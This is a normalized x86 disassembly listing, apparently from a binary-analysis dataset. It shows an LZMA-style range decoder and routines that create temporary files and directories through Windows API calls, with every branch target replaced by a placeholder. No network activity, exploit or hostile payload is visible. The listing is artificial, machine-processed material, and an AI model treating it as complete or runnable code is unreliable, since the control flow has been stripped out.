add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ esp + 0x10 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ esp + 0x10 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ebx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
lea edx [ ebx + ebx ]
movzx ebx [ edx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ebx
shr eax 0x5
sub ebx eax
mov [ edx + ecx ] bx
mov [ esp + 0x10 ] esi
inc edx
mov edi eax
mov eax 0x800
sub eax ebx
shr eax 0x5
add eax ebx
mov [ edx + ecx ] ax
jmp r-xdata
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x48 ]
mov [ esp + 0x44 ] ecx
mov ecx [ esp + 0x34 ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x2c ]
lea ebx [ edx + 0x1 ]
mov [ esp + 0x34 ] ecx
mov [ esp + 0x2c ] ebx
test eax eax
jne r-xdata
mov ecx edx
mov ebx edx
shr ecx 0x1
and edx 0x1
dec ecx
or edx 0x2
cmp ebx 0xe
jae r-xdata
sub edx 0x40
cmp edx 0x4
jb r-xdata
cmp edx eax
cmp edx [ esp + 0x20 ]
jmp r-xdata
sub ecx 0x4
shl edx cl
mov eax edx
sub eax ebx
mov ebx [ esp + 0x18 ]
add ebx 0x55e
lea eax [ ebx + eax * 2 ]
xor ebx ebx
inc ebx
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] ebx
mov ebp ebx
cmp [ esp + 0x1c ] 0x13
mov ecx [ esp + 0x28 ]
sbb eax eax
and eax 0xfffffffd
add eax 0xa
mov [ esp + 0x1c ] eax
jmp r-xdata
jae r-xdata
shr edi 0x1
sub esi edi
mov eax esi
shr eax 0x1f
neg eax
lea edx [ edx * 2 + 0x1 ]
add edx eax
and eax edi
add esi eax
dec ecx
jne r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov eax edi
shr eax 0xb
imul eax ebx
cmp esi eax
jae r-xdata
mov eax [ esp + 0x14 ]
shl esi 0x8
movzx eax [ eax ]
shl edi 0x8
or esi eax
inc [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x50 ]
add ecx 0x2
mov [ esp + 0x28 ] ecx
cmp eax ebp
je r-xdata
cmp edi 0x1000000
jae r-xdata
mov ebx [ esp + 0x18 ]
shl edx 0x4
movzx ecx [ ebx + 0x646 ]
mov [ esp + 0x14 ] ebp
mov [ esp + 0x10 ] esi
cmp edi 0x1000000
jae r-xdata
sub edi eax
sub esi eax
mov eax ebx
shr eax 0x5
sub ebx eax
mov eax [ esp + 0x40 ]
mov [ eax + ebp ] bx
mov eax [ esp + 0x44 ]
inc ebp
or edx eax
mov edi eax
mov eax 0x800
sub eax ebx
shr eax 0x5
add eax ebx
mov ebx [ esp + 0x40 ]
mov [ ebx + ebp ] ax
mov eax [ esp + 0x44 ]
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
add ebp ebp
movzx ebx [ eax + ebp ]
cmp edi 0x1000000
jae r-xdata
mov [ esp + 0x10 ] esi
jmp r-xdata
add eax eax
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x40 ]
dec ecx
jne r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov [ esp + 0x10 ] esi
mov [ ebx + 0x646 ] cx
push 0x3
or edx 0x1
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov [ ebx + 0x646 ] ax
push 0x2
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
mov eax [ esp + 0x1c ]
pop ebx
add ebx ebx
movzx ecx [ ebx + eax + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x18 ]
inc ebx
mov [ ebx + eax + 0x643 ] cx
mov [ esp + 0x10 ] esi
or edx 0x2
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x18 ]
mov [ ebx + ecx + 0x644 ] ax
mov eax ecx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
add ebx ebx
movzx ecx [ ebx + eax + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x18 ]
inc ebx
mov [ ebx + eax + 0x643 ] cx
mov [ esp + 0x10 ] esi
or edx 0x4
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x18 ]
mov [ ebx + ecx + 0x644 ] ax
mov eax ecx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
movzx ecx [ eax + ebx * 2 + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] esi
mov [ eax + ebx * 2 + 0x644 ] cx
or edx 0x8
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x18 ]
mov [ ecx + ebx * 2 + 0x644 ] ax
jmp r-xdata
mov ebx [ esp + 0x28 ]
mov edx [ esp + 0x1c ]
add ebx 0x112
sub edx 0xc
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
mov ecx [ esp + 0x14 ]
cmp edi 0x1000000
jae r-xdata
sub_408029
push ecx
push edi
mov edi [ ecx + 0x48 ]
mov eax edx
test edi edi
je r-xdata
pop edi
pop ecx
retn
cmp edi 0x112
jae r-xdata
mov edx [ ecx + 0x24 ]
push ebx
mov ebx [ ecx + 0x14 ]
push ebp
mov ebp [ ecx + 0x28 ]
sub eax edx
push esi
cmp eax edi
mov esi edi
cmovb esi eax
cmp [ ecx + 0x30 ] 0x0
mov [ esp + 0x10 ] ebp
mov ebp [ ecx + 0x38 ]
jne r-xdata
add [ ecx + 0x2c ] esi
sub edi esi
mov [ ecx + 0x48 ] edi
test esi esi
je r-xdata
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x2c ]
cmp eax esi
ja r-xdata
pop esi
pop ebp
mov [ ecx + 0x24 ] edx
pop ebx
mov edi [ esp + 0x10 ]
mov eax [ ecx + 0xc ]
mov [ ecx + 0x30 ] eax
cmp edx ebp
sbb eax eax
and eax edi
sub eax ebp
add eax edx
mov al [ eax + ebx ]
mov [ edx + ebx ] al
inc edx
dec esi
jne r-xdata
sub_40809b
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi edx
mov esi ecx
push ebx
mov ecx esi
call sub_407355
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov ebp [ esi + 0x24 ]
sub ecx [ esi + 0x2c ]
mov eax edi
sub eax ebp
cmp eax ecx
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0xc ]
cmp [ esi + 0x2c ] eax
jb r-xdata
lea edx [ ecx + ebp ]
mov edx edi
mov ecx esi
call sub_408029
cmp [ esi + 0x24 ] edi
jae r-xdata
mov [ esi + 0x30 ] eax
cmp [ esi + 0x48 ] 0x112
jbe r-xdata
cmp [ esi + 0x18 ] ebx
jae r-xdata
xor eax eax
mov [ esi + 0x48 ] 0x112
cmp [ esi + 0x48 ] 0x112
jb r-xdata
cmp [ esi + 0x30 ] 0x0
mov edx edi
jne r-xdata
sub_40810f
sub esp 0x18
mov eax [ esp + 0x1c ]
push ebx
push ebp
mov ebp ecx
mov ebx edx
mov ecx [ ebp + 0x8 ]
add eax ebx
mov [ esp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esp + 0x24 ] eax
xor eax eax
inc eax
shl eax cl
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x10 ] edx
mov edx [ ebp + 0x34 ]
dec eax
and eax [ ebp + 0x2c ]
push esi
mov esi [ ebp + 0x20 ]
mov [ esp + 0x10 ] eax
mov eax edx
shl eax 0x4
add eax [ esp + 0x10 ]
push edi
mov edi [ ebp + 0x1c ]
movzx ecx [ ecx + eax * 2 ]
cmp edi 0x1000000
jae r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
cmp ebx [ esp + 0x10 ]
jae r-xdata
mov ebp [ esp + 0x10 ]
sub edi eax
sub esi eax
mov eax [ esp + 0x2c ]
movzx ecx [ eax + edx * 2 + 0x180 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax [ ebp + 0x10 ]
add eax 0xe6c
cmp [ ebp + 0x30 ] 0x0
mov [ esp + 0x2c ] eax
jne r-xdata
xor eax eax
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ esp + 0x18 ] ebx
mov eax edi
shr eax 0xb
imul eax ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
mov ecx [ ebp + 0x24 ]
test ecx ecx
jne r-xdata
cmp [ ebp + 0x2c ] 0x0
je r-xdata
sub edi eax
sub esi eax
push 0x3
pop eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x2c ]
movzx eax [ eax + edx * 2 + 0x198 ]
mov [ esp + 0x20 ] eax
cmp edi 0x1000000
jae r-xdata
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x2c ]
push 0x2
mov edi eax
pop eax
add ecx 0x664
mov [ esp + 0x18 ] eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax [ ebp + 0x14 ]
push 0x8
movzx edx [ eax + ecx - 0x1 ]
xor eax eax
pop ecx
sub cl [ ebp ]
inc eax
shr edx cl
mov ecx [ ebp + 0x4 ]
shl eax cl
mov ecx [ ebp ]
dec eax
and eax [ ebp + 0x2c ]
shl eax cl
add edx eax
mov eax [ esp + 0x2c ]
imul edx edx 0x600
add eax edx
mov edx [ ebp + 0x34 ]
mov [ esp + 0x2c ] eax
mov ecx [ ebp + 0x28 ]
cmp edx 0x7
jae r-xdata
mov ecx edi
shr ecx 0xb
imul ecx eax
cmp esi ecx
jae r-xdata
cmp ebx ebp
jae r-xdata
movzx edx [ ecx ]
cmp edi 0x1000000
jae r-xdata
mov ecx [ ebp + 0x38 ]
cmp [ ebp + 0x24 ] ecx
jae r-xdata
xor ecx ecx
inc ecx
mov eax [ esp + 0x2c ]
sub edi ecx
sub esi ecx
movzx ecx [ eax + edx * 2 + 0x1b0 ]
cmp edi 0x1000000
jae r-xdata
lea eax [ edx + 0xf ]
mov edx [ esp + 0x2c ]
shl eax 0x4
add eax [ esp + 0x14 ]
mov edi ecx
movzx edx [ edx + eax * 2 ]
cmp ecx 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
or esi eax
mov eax [ esp + 0x20 ]
shl edi 0x8
inc ebx
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
xor edx edx
mov edx [ ebp + 0x28 ]
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
cmp ebx [ esp + 0x10 ]
jae r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jb r-xdata
cmp ebx ebp
jae r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
movzx edx [ ecx + 0x2 ]
sub edi eax
sub esi eax
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax [ esp + 0x14 ]
shl eax 0x4
add eax 0x4
push 0x8
add eax ecx
pop edx
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ esp + 0x20 ]
cmp esi eax
jae r-xdata
cmp ebx [ esp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
add eax [ ebp + 0x24 ]
mov ebp 0x100
movzx eax [ eax + edx ]
xor edx edx
inc edx
sub edi eax
sub esi eax
inc ecx
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov edi eax
jmp r-xdata
sub edi eax
sub esi eax
mov eax [ esp + 0x2c ]
movzx ecx [ eax + edx * 2 + 0x1c8 ]
cmp edi 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
sub edi eax
sub esi eax
cmp eax 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
mov [ esp + 0x14 ] eax
sub edi eax
sub esi eax
lea edx [ edx * 2 + 0x1 ]
mov edi eax
add edx edx
not ecx
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ esp + 0x18 ] ebx
xor eax eax
inc eax
jmp r-xdata
mov eax [ esp + 0x2c ]
jmp r-xdata
cmp ecx 0x100
jae r-xdata
mov ecx [ esp + 0x2c ]
mov [ esp + 0x20 ] 0xc
add ecx 0xa68
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
push 0x3
pop eax
jmp r-xdata
cmp ebx ebp
jae r-xdata
push 0x10
pop edx
sub edi eax
sub esi eax
mov [ esp + 0x1c ] edx
lea eax [ ecx + 0x204 ]
mov edx 0x100
mov edi eax
mov eax [ esp + 0x14 ]
shl eax 0x4
add eax 0x104
add eax ecx
mov [ esp + 0x14 ] eax
push 0x8
pop eax
mov [ esp + 0x1c ] eax
mov edx eax
mov eax [ esp + 0x14 ]
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ esp + 0x24 ]
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
mov eax [ esp + 0x1c ]
jmp r-xdata
and ebp ecx
cmp edx 0x100
jae r-xdata
cmp edi 0x1000000
jae r-xdata
add ecx ecx
movzx edx [ ecx + eax ]
cmp edi 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
xor ecx ecx
inc ecx
sub edi eax
sub esi eax
inc ecx
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov ebx [ esp + 0x2c ]
add eax eax
mov ecx ebp
and ecx eax
mov [ esp + 0x1c ] eax
lea eax [ ecx + edx ]
add eax ebp
movzx eax [ ebx + eax * 2 ]
mov ebx [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
cmp edi 0x1000000
jae r-xdata
cmp ebx [ esp + 0x10 ]
jb r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
add ecx eax
cmp [ esp + 0x20 ] 0x4
jae r-xdata
mov eax [ esp + 0x14 ]
jmp r-xdata
cmp ecx edx
jae r-xdata
mov eax [ esp + 0x18 ]
mov eax [ esp + 0x2c ]
push 0x3
cmp ecx 0x4
pop edx
cmovb edx ecx
shl edx 0x7
add eax 0x360
add eax edx
xor edx edx
mov [ esp + 0x24 ] eax
inc edx
add ecx ecx
movzx eax [ ecx + eax ]
mov [ esp + 0x24 ] eax
cmp edi 0x1000000
jae r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
sub edi eax
sub esi eax
inc edx
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
sub edx 0x40
cmp edx 0x4
jb r-xdata
mov eax [ esp + 0x24 ]
jmp r-xdata
cmp edx 0x40
jae r-xdata
mov ecx edx
shr ecx 0x1
dec ecx
cmp edx 0xe
jae r-xdata
add edx edx
movzx ecx [ edx + eax ]
cmp edi 0x1000000
jae r-xdata
sub ecx 0x4
mov eax edx
and eax 0x1
or eax 0x2
shl eax cl
sub eax edx
mov edx [ esp + 0x2c ]
lea edx [ edx + eax * 2 ]
add edx 0x55e
jmp r-xdata
shr edi 0x1
mov eax esi
sub eax edi
shr eax 0x1f
dec eax
and eax edi
sub esi eax
dec ecx
jne r-xdata
cmp ebx ebp
jae r-xdata
xor eax eax
inc eax
cmp edi 0x1000000
jae r-xdata
mov edx [ esp + 0x2c ]
push 0x4
add edx 0x644
pop ecx
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ esp + 0x24 ]
cmp esi eax
jae r-xdata
cmp ebx ebp
jae r-xdata
sub edi eax
sub esi eax
mov eax [ esp + 0x2c ]
inc eax
mov edi eax
mov eax [ esp + 0x2c ]
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
add eax eax
mov [ esp + 0x2c ] eax
movzx eax [ eax + edx ]
mov [ esp + 0x24 ] eax
cmp edi 0x1000000
jae r-xdata
dec ecx
jne r-xdata
sub_408697
movzx eax [ edx + 0x2 ]
push esi
movzx esi [ edx + 0x1 ]
shl esi 0x8
or esi eax
movzx eax [ edx + 0x3 ]
shl esi 0x8
or esi eax
movzx eax [ edx + 0x4 ]
or [ ecx + 0x1c ] 0xffffffff
and [ ecx + 0x4c ] 0x0
shl esi 0x8
or esi eax
mov [ ecx + 0x20 ] esi
pop esi
retn
sub_4086c4
push esi
xor esi esi
xor eax eax
inc esi
mov [ ecx + 0x4c ] esi
mov [ ecx + 0x48 ] eax
mov [ ecx + 0x58 ] eax
test edx edx
je r-xdata
cmp [ esp + 0x8 ] eax
je r-xdata
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x30 ] eax
mov [ ecx + 0x50 ] esi
pop esi
retn
mov [ ecx + 0x50 ] esi
sub_4086fa
push esi
mov esi ecx
mov eax 0x300
mov ecx [ esi + 0x4 ]
add ecx [ esi ]
shl eax cl
add eax 0x736
je r-xdata
xor eax eax
inc eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x38 ] eax
and [ esi + 0x34 ] 0x0
and [ esi + 0x50 ] 0x0
pop esi
retn
mov ecx eax
mov eax 0x400
movzx edx ax
mov eax edx
shl edx 0x10
push edi
mov edi [ esi + 0x10 ]
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
pop edi
sub_408748
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
mov ebx [ ebp ]
and [ ebp ] 0x0
mov eax edx
push edi
mov [ esp + 0x14 ] eax
mov esi ecx
call sub_408029
mov edx [ esp + 0x30 ]
xor edi edi
and [ edx ] 0x0
inc edi
cmp [ esi + 0x48 ] 0x112
je r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
test ecx ecx
setne al
mov [ edx ] edi
mov eax [ esp + 0x14 ]
and [ esp + 0x10 ] 0x0
cmp [ esi + 0x24 ] eax
jb r-xdata
test ebx ebx
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
jne r-xdata
cmp [ esi + 0x58 ] 0x5
jb r-xdata
mov ecx [ esp + 0x24 ]
mov ecx [ esi + 0x58 ]
mov [ esp + 0x1c ] ecx
test ecx ecx
jne r-xdata
mov ecx esi
call sub_4086fa
cmp [ esp + 0x2c ] 0x0
je r-xdata
cmp [ esi + 0x20 ] eax
je r-xdata
mov eax [ esp + 0x30 ]
mov [ eax ] 0x3
lea edx [ esi + 0x5c ]
cmp [ edx ] 0x0
jne r-xdata
mov [ esp + 0x24 ] ecx
mov al [ ecx ]
mov [ edx + esi + 0x5c ] al
inc [ esi + 0x58 ]
inc ecx
inc [ ebp ]
dec ebx
jne r-xdata
xor edx edx
mov [ esp + 0x18 ] edx
cmp ecx 0x14
jae r-xdata
cmp ebx 0x14
jb r-xdata
xor edi edi
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov [ eax ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax edi
jmp r-xdata
mov ecx esi
call sub_408697
and [ esi + 0x58 ] 0x0
mov edx [ esi + 0x58 ]
cmp edx 0x5
jae r-xdata
mov [ esi + 0x58 ] ecx
cmp ecx 0x14
jb r-xdata
mov ebp [ esp + 0x24 ]
mov edx [ esp + 0x24 ]
push ebx
mov ecx esi
call sub_40810f
pop ecx
test eax eax
je r-xdata
cmp [ esp + 0x10 ] ecx
jne r-xdata
mov eax [ esp + 0x30 ]
mov [ eax ] 0x2
jmp r-xdata
mov [ esp + 0x10 ] edi
xor eax eax
jmp r-xdata
push ecx
lea edx [ esi + 0x5c ]
mov ecx esi
call sub_40810f
pop ecx
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov ebp [ esp + 0x28 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ecx
mov al [ edx + ebp ]
mov [ ecx + esi + 0x5c ] al
inc ecx
inc edx
cmp ecx 0x14
jb r-xdata
push ebx
push [ esp + 0x28 ]
lea eax [ esi + 0x5c ]
push eax
call sub_410c10
add esp 0xc
add [ ebp ] ebx
mov [ esi + 0x58 ] ebx
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ esp + 0x24 ]
lea ecx [ eax - 0x14 ]
add ecx ebx
jmp r-xdata
mov ecx [ esp + 0x18 ]
add [ ebp ] ecx
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edx [ esp + 0x14 ]
lea eax [ esi + 0x5c ]
push eax
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_40809b
test eax eax
jne r-xdata
cmp edx ebx
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx eax
cmp eax 0x2
jne r-xdata
mov edx [ esp + 0x14 ]
push ecx
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_40809b
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
sub eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
sub eax esi
add ecx 0xffffffa4
add eax ecx
add [ ebp ] eax
add [ esp + 0x24 ] eax
sub ebx eax
and [ esi + 0x58 ] 0x0
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x18 ]
sub eax ecx
add [ ebp ] eax
add ecx eax
mov [ esp + 0x24 ] ecx
sub ebx eax
jmp r-xdata
mov edx [ esp + 0x30 ]
cmp [ esi + 0x48 ] 0x112
jne r-xdata
sub_4089a1
push esi
push edi
push 0x5
pop edi
mov esi ecx
cmp [ esp + 0xc ] edi
jae r-xdata
movzx ecx [ edx + 0x4 ]
movzx eax [ edx + 0x3 ]
shl ecx 0x8
or ecx eax
movzx eax [ edx + 0x2 ]
shl ecx 0x8
or ecx eax
movzx eax [ edx + 0x1 ]
shl ecx 0x8
or ecx eax
mov eax 0x1000
cmp ecx eax
cmovb ecx eax
mov al [ edx ]
mov [ esi + 0xc ] ecx
cmp al 0xe1
jae r-xdata
push 0x4
pop eax
jmp r-xdata
movzx eax al
cdq
push 0x9
pop ecx
idiv ecx
movzx eax al
mov [ esi ] edx
cdq
idiv edi
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edx
xor eax eax
pop edi
pop esi
retn
sub_408a01
push ebx
mov ebx ecx
mov ecx [ edx + 0x4 ]
add ecx [ edx ]
push edi
mov edi 0x300
shl edi cl
add edi 0x736
cmp [ ebx + 0x10 ] 0x0
je r-xdata
push esi
mov esi [ esp + 0x10 ]
mov edx esi
mov ecx ebx
call sub_40898f
lea eax [ edi + edi ]
push eax
push esi
call [ esi ]
pop ecx
pop ecx
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x54 ] edi
pop esi
test eax eax
jne r-xdata
cmp edi [ ebx + 0x54 ]
je r-xdata
xor eax eax
push 0x2
pop eax
jmp r-xdata
pop edi
pop ebx
retn
sub_408a4e
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
push [ ebp + 0x8 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
call sub_4089a1
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
push [ ebp + 0xc ]
lea edx [ ebp - 0x10 ]
mov ecx edi
call sub_408a01
pop ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_408ab4
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi 0x208
xor ebx ebx
push edi
lea eax [ ebp - 0x20c ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x418 ] ebx
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x104
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push edi
lea eax [ ebp - 0x414 ]
push ebx
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push ebx
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x414 ]
push eax
mov ecx esi
call sub_402193
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
sub_408b4b
push 0x434
mov eax sub_41de1b
call sub_4113ab
mov esi ecx
xor eax eax
xor edi edi
push 0x206
mov [ ebp - 0x424 ] ax
lea eax [ ebp - 0x422 ]
push edi
push eax
mov [ ebp - 0x428 ] edi
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x424 ]
push 0x104
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
lea eax [ ebp - 0x21c ]
push edi
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x21c ]
push eax
push edi
push r--data
lea eax [ ebp - 0x424 ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ DeleteFileW@IAT ]
push edi
lea eax [ ebp - 0x21c ]
push eax
call [ CreateDirectoryW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x440 ]
call sub_402193
push r--data
mov edx eax
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_409abe
pop ecx
lea ecx [ ebp - 0x440 ]
call sub_40223f
mov eax esi
call sub_41135a
retn
sub_408c1a
push ebp
mov ebp esp
mov eax 0x1038
call sub_413dc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi edx
push ecx
mov edx ecx
lea ecx [ ebp - 0x1038 ]
call sub_408d42
mov ecx eax
mov [ esp ] r--data
call j_sub_40239d#2
push eax
call sub_40fd3d
pop ecx
pop ecx
lea ecx [ ebp - 0x1038 ]
mov esi eax
call sub_40211d
test esi esi
jne r-xdata
push ecx
mov edx edi
lea ecx [ ebp - 0x1020 ]
call sub_408d42
mov ecx eax
mov [ esp ] r--data
call j_sub_40239d#2
push eax
call sub_40fd3d
pop ecx
pop ecx
lea ecx [ ebp - 0x1020 ]
mov edi eax
call sub_40211d
test edi edi
je r-xdata
xor al al
jmp r-xdata
push 0xfff
lea eax [ ebp - 0x1007 ]
push 0x0
push eax
mov [ ebp - 0x1008 ] 0x0
call sub_414c70
add esp 0xc
push esi
call sub_40fd52
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
push esi
test eax eax
je r-xdata
push 0x1000
